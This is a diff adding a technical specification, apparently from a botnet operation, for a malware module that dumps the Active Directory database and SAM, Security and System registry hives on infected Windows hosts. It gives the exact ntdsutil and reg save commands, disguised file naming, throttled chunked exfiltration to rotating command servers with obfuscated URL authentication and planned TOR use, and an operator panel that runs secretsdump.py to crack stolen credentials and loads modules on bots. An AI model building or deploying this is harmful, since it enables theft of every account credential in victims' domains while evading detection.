@@ -1,0 +1,320 @@
+ACTIVE DIRECTORY DB AND WINDOWS LOCAL ACCOUNTS DUMP MODULE
+TECHNICAL TASK
+
+
+GOAL
+
+Unloading data from the Active Directory database and local accounts, designed as a module.
+
+
+PRINCIPLE OF OPERATION
+
+The module uses the standard `ntdsutil' utility to unload the database.
+Then the data is uploaded to the server, where it is decrypted and analyzed by the Python package impacket / secretsdump.py
+The module performs an Active Directory database dump as described in this article:
+https://devteev.blogspot.com/2014/04/hacking-tricks-easy-way-to-get-ntdsdit.html
+
+The module also dumps the HKLM/SAM, HKLM/Security and HKLM/System registry branches.
+
+
+IMPLEMENTATION
+
+The program must be formatted as a module in accordance with the modules_HOWTO document.
+Module/project name - ADll.
+Assume that the module works with SYSTEM rights.
+
+* Before you start, you should check if the computer has an Active Directory service.
+
+* If not, send "AD not found" message and exit.
+
+* Next, you need to make sure that the Volume Shadow Copy service is running via WinAPI
+(similar to the sc query vss command), and if not, start (restart) this service.
+
+* Next, the names of the dump files are formed.
+Total dump files 4:
+ntds.dit
+sam.dump
+security.dump
+system.dump
+
+However, in the file system, these files must have different names:
+<prefix>0.dat
+<prefix>1.dat
+<prefix>2.dat
+<prefix>3.dat
+
+The prefix must be formed as a hash of the string ParentInfo.ParentID (see module_HOWTO) and at the same time satisfy the conditions:
+- the value at the input always corresponds to the same value at the output
+- it is impossible to restore the input value from the output value
+- the length of the output hash does not depend on the length of the input string
+- resulting hash contains only alphanumeric characters (human readable and file system friendly)
+- the algorithm is simple.
+
+We can propose the following algorithm:
+- 64-bit unsigned sum of all bytes (treated as unsigned) of the ParentInfo.ParentID field is calculated
+- 64-bit integer is treated as an array of unsigned char filename[8]
+- all bytes less than 'a' become 'a'
+- all bytes greater than 'Z' become 'Z'
+Thus, given the input of the same string, the output is also always the same string, which looks random.
+
+However, the choice of algorithm is up to the developer.
+
+* the module checks for the presence of at least one of these files in the %TEMP% directory
+If the file(s) exist, they are sent using the file transfer protocol.
+The dump described in the next two paragraphs is not produced - because, obviously, the module did not finish last time,
+and now we continue to work.
+
+*Next you need to run the command
+
+ntdsutil "ac in ntds" "ifm" "cr fu %temp%\<prefix>0.dat" q q
+
+If possible, you should implement all the actions of this command through WinAPI
+(in the second version; in the first version we do it through the command).
+
+* We dump the HKLM/SAM, HKLM/Security and HKLM/System registry branches with commands
+
+reg save hklm\sam %temp%\somepath\<prefix>1.dat
+reg save hklm\security %temp%\somepath\<prefix>2.dat
+reg save hklm\system %temp%\somepath\<prefix>3.dat
+
+* The resulting data dump files are transferred using the file transfer protocol (see the corresponding section).
+At the same time, compression and file transfer work in a stream with a lower priority (so as not to give peaks in the load on the CPU and network).
+The chunk sizes are selected based on the constant (setting) chunksize. The default size of the constant is 10M.
+
+Server addresses are randomly taken from the config (see below).
+There must be a pause between sendings of each piece of the file, randomly selected from the interval TIMEOUT_MIN ... TIMEOUT_MAX
+(compile time constants). Sending is done in one thread.
+If the send fails (failed to connect; received non-HTTP 200 OK response; no response at all),
+a pause is made for some time (set by a compile-time constant), the next random server is taken,
+and so on until success.
+After a successful dispatch, the module sends the WantRelease event to the parent process and sleeps in an eternal loop
+
+while(1) Sleep(1000);
+
+waiting for the parent process to exit the module.
+
+
+CONFIG
+
+The module has a single config called srvad.
+The config is plain text, separated by \r\n.
+One line is one URL to send data to.
+If the http or https protocol prefix is ​​not specified, extract the port from the URL.
+If the port is even, work over http, if odd - over https.
+
+For the second version, provide work through TOR addresses.
+A lightweight TOR library will be provided.
+
+
+FILE TRANSFER PROTOCOL
+
+The file transfer protocol satisfies the following requirements:
+- no peak load on the Internet channel
+- the ability to transfer the file in parts.
+
+1) basic information about the computer is sent to the server via HTTP POST in a multipart/form-data container (similar to a normal html form submission).
+POST contains the following fields:
+timestamp - local UNIX time
+ip - ParentInfo.SelfIP field (see module_HOWTO)
+ip1 - address of the first network interface
+ip2 - address of the second network interface
+...
+ipN - address of N-th network interface
+cid - ParentInfo.ParentID field (see module_HOWTO)
+group - ParentInfo.ParentGroup field (see module_HOWTO)
+hostname - hostname obtained via GetComputerName()
+source - the string `ntds'
+
+Sending occurs to the url of the form:
+http://foo.com/<junk>/<auth>/<junk>
+junk - arbitrary characters allowed in the URI, except for the slash /
+auth - authorization section. It is assumed that the one who sends the request,
+must know the rules for the formation of this section.
+This is a random of any length.
+It requires:
+- letter Z in any position
+- the sum of the digits (not numbers!) from the 6th to the 15th position should be 31.
+The symbols between them are random. In particular, there may be Z.
+Section example - abcde7ol7k9hi8mZ
+
+
+2) then each file is sent in parts, with an HTTP POST request, in a multipart/form-data container.
+The file is transferred to the file field.
+The filename is taken from the Content-Disposition tag; the name of the temporary file from the URI is ignored.
+Wherein:
+- file sending starts from the end. For example, if the file is 100M long, we send the last 10M of the file.
+- after sending a piece of the file and receiving confirmation, the file is truncated - only the unsent part remains, starting from the end.
+This is done in order to keep the state of the send in a simple way, and to minimize the number of file operations.
+You can truncate a file by calling SetEndOfFile().
+- before sending, the sent piece of the file is read into memory and compressed by the gzip algorithm.
+- sending is performed to the URL of the form
+http://foo.com/<junk>/<auth>/<cid>/<filename>/<start>/<end>/<eof>
+where
+junk - arbitrary characters allowed in the URI, except for the slash /
+auth - authorization section. This is a random of any length, in which
+- letter S in any position
+- the sum of the digits (not numbers!) from the 8th to the 15th position should be 25.
+filename - temporary file name;
+start - initial offset of the transferred piece relative to the beginning of the file; both letters and numbers are allowed here.
+But only numbers are significant, in the order they appear in the string.
+For example, 0A is the number 0 (the digit 0 is significant, the letter A is ignored).
+end - final offset of the transferred piece relative to the beginning of the file; the rules are the same as for start.
+For example, 3A5A2A3A9A5A9A is 3523959.
+eof - sign of the end of the file. If there is a sign, this is the last piece of the file; and vice versa (optional section)
+This is a random of any length, in which the following are required:
+- the first digit is even or 0
+- last letter A or F
+
+The last character of the file name (before the extension) has the following meaning:
+0 - ntds.dit
+1 - sam.dump
+2 - security.dump
+3 - system.dump
+
+When handling errors, the HTTP response code 200 does not indicate the success of the operation,
+but a non-200 code means the operation failed (for example, 50* or 40* from the proxy).
+The exact opcode is contained inside the XML in the HTTP response body, inside the <response> tag.
+When receiving a response code like 4041, the append character 1 is the server's internal error code (enabled only during debugging).
+
+For example, the following response indicates error code 9:
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Mon, 07 Oct 2019 13:08:44 GMT
+Content-Type: application/xml; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary:Accept
+
+<?xml version="1.0" encoding="UTF-8"?>
+<response>4049</response>
+
+The next answer is no error, everything is ok
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Mon, 07 Oct 2019 13:08:44 GMT
+Content-Type: application/xml; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary:Accept
+
+<?xml version="1.0" encoding="UTF-8"?>
+<response>200</response>
+
+ADMIN
+
+The use of the received data will be done through the admin panel.
+Requirements for registration are minimal - reasonable simplicity.
+
+The main screen shows a list of the latest received data in a table format:
+
+datetime | ClientID| group | IP | hostname | total size
+
+with paging.
+
+datetime - for the last reception by the selected ClientID (see below about grouping of messages).
+
+Provide filtering by fields:
+- datetime (range from and to)
+- ClientID
+- Group
+- IP
+- host name
+- Total Size (range from and to)
+
+Interface language - English.
+All scripts must not contain Russian strings and variables in Russian (var $issledovanie - bad; var $research - good).
+
+The list should be sorted by header fields.
+
+The record can be opened for viewing; the entry can be deleted (after three "Are you sure?" warnings in increasingly large font and increasingly red).
+The delete record button is available only in a record that is open for viewing.
+Adding and editing entries is not provided.
+
+An open record must list the files contained in the record; each file can be downloaded.
+
+An open record should have a "Data Analysis" button.
+While the analysis is going on, the analysis indicator (a clock wheel or something like that) should "spin".
+
+Analysis of Active Directory data occurs by running two scripts:
+
+sudo ./secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile result local
+
+where ntds.dit and SYSTEM are the raw files from the archive received from the modules
+result - the name of the resulting file
+
+Analysis of local accounts:
+
+secretsdump.py -sam sam.dump -security security.dump -system system.dump LOCAL
+
+In this case, the admin must:
+- unload the files ntds.dit, sam.dump, security.dump, system.dump needed by the script somewhere in a temporary folder
+(these files are contained in the record)
+- run scripts by giving them paths to these files
+- read stdout, stderr of scripts and issue them in a frame on the page
+- add a button "Download analysis result" to download the analysis result, in the form of .txt or .zip.
+To do this, you may have to cache the result of the analysis, or save it in a record.
+
+ ***
+
+The Python script setup is something like this:
+
+pip
+pip install package
+pip install impacket --upgrade (if needed)
+
+pip install pycrypto (--upgrade if needed)
+
+pip install pyasn1 (if needed)
+
+apt-get install python-dev (if needed)
+
+
+
+ADMIN API
+
+The admin panel must set the API for receiving data from modules:
+
+POST /api/v1/hello HTTP/1.1
+
+This request creates or updates a metadata record from a specific client. There is no data in this file yet.
+(See FILE TRANSFER PROTOCOL).
+
+POST /api/v1/savef/<cid>/<filename>/<start>/<end>/e
+
+This request allows you to save part of the file (see FILE TRANSFER PROTOCOL).
+
+All answers 200 - OK.
+All responses are not 200 - error. Clarifying error text at the discretion of the API developer.
+
+When creating a data warehouse, proceed from the fact that the size of files can be significant (gigabytes in one package).
+A data archive always contains the same set of data. File names can be specified, but as a first approximation they are:
+
+ntds.dit
+sam.dump
+security.dump
+system.dump
+
+When saving data to the database / to disk, you need to save the date and time of their arrival.
+
+IMPORTANT!
+One conditional RECORD in the database is formed by 4 (four!) files.
+Only one file can be transferred per package (at best).
+Therefore, when saving to the database, you need to group files to the main record by the cid key.
+Please note that the transfer of gigabyte packages may take several days.
+
+
+MODIFICATION OF "DARK" ADMINKA
+
+You need to modify the "dark" admin panel in such a way that you can simply run modules.
+On the bot details screen (/log/1234), you need to add a list of buttons with the names of frequently used modules, for example
+injectDll
+pwgrab
+importDll
+etc
+
+These names can be taken either from the directory of known modules, or hardwired into the code (the first is preferable).
+For modules already loaded and working on the bot, the button with its name should work on shutdown (i.e. pressing the button unloads the module).
+For non-working modules, the button loads the module.
+Because The reaction to the loading of the module occurs within a few minutes, you need to block the button from being pressed until you receive a reaction from the bot.
+
